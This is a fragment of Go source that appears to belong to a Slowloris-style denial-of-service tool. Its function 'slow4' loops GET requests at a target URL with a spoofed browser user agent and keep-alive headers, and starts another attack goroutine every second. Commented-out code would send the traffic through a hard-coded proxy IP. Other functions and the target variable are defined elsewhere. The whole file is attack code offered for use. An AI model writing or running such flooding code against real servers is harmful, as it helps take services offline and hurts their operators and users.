package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	// "net/url"
	"time"
)

func slow4() {
	// proxyURL, err := url.Parse("http://74.208.177.198:80")
	// if err != nil {
	// 	//fmt.Println(err)
	// 	newErr := fmt.Errorf("Proxy Error: %v", err)
	// 	fmt.Println(newErr)
	// 	return
	// }

	// transport := &http.Transport{
	// 	Proxy: http.ProxyURL(proxyURL),
	// }
	// client1 := &http.Client{Transport: transport}
	// print(client1)

	client := &http.Client{}

	req, err := http.NewRequest("GET", _url, nil)
	if err != nil {
		//fmt.Println(err)
		newErr := fmt.Errorf("Error occurred while creating HTTP request: %v", err)
		fmt.Println(newErr)
		return

	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0")
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	// Send partial request
	//req.ContentLength = 10000

	// Keep connection alive
	for {
		req.Header.Set("X-a", "b")

		resp, err := client.Do(req)
		if err != nil {
			newErr := fmt.Errorf("Slow4 inner For loop Error: %v", err)
			fmt.Println(newErr)
			return
		}
		defer resp.Body.Close()
		io.Copy(ioutil.Discard, resp.Body)
		print("slow4")
		go slow3()
		time.Sleep(time.Second)
	}
}
